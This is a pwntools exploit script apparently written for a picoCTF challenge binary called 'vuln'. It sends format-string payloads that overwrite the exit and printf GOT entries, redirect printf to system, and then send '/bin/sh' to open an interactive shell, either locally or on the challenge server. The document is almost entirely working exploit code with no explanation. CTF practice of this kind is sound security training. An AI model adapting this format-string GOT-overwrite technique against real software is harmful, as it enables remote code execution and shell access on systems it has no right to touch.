from pwn import *
elf = ELF("./vuln")

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *buy_stonks+229",
		"b *buy_stonks+224",
		"c"
	]))
elif args.REMOTE:
	p = remote("mercury.picoctf.net", 5654)
else:
	p = process(elf.path) 

print(f'exit {hex(elf.got["exit"])}')
print(f'printf {hex(elf.got["printf"])}')

# loop program
p.sendlineafter(b'2) View my portfolio\n', b'1')
payload = '%c'* 10
payload += f'%{elf.got["exit"]-10}c%n'
payload += f'%60205c%20$hn'
print(payload)
p.sendlineafter(b'What is your API token?\n', payload.encode())

# printf -> system
p.sendlineafter(b'2) View my portfolio\n', b'1')
payload = '/bin/sh;' + '%c' * 18
payload += f'%{0x38-18-8}c%hhn'
payload += f'%{elf.symbols["system"]-0x38}c%28$lln'
print(payload)
p.sendlineafter(b'What is your API token?\n', payload.encode())

# trigger printf (system) with /bin/sh
p.sendlineafter(b'2) View my portfolio\n', b'1')
p.sendline(b'/bin/sh')

p.interactive()



